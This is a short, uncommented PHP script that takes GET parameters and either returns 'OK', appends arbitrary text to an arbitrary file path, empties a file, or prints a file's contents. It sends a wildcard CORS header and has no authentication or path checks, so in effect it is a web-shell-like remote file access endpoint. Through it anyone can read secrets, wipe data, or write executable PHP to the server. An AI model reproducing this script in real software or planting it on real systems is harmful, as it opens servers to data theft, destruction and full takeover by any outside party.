<?php 
header('Access-Control-Allow-Origin:*');
$md=$_GET['o'];
$file=$_GET['n'];
$message=$_GET['m'];
if($md=="c")
{
	echo "response:OK.";
}
if($md=="w")
{
	echo "file:", $file, "<br>";
	echo "msg:", $message;
	file_put_contents($file, $message, FILE_APPEND | LOCK_EX);
}
if($md=="d")
{
	file_put_contents($file, "", LOCK_EX);
}
if($md=="r")
{
	$f=fopen($file,"r") or exit("Error: Can's open the file!");
	while(!feof($f))
	{
	    echo fgets($f). "\n";
	}
	fclose($f);
}
?>
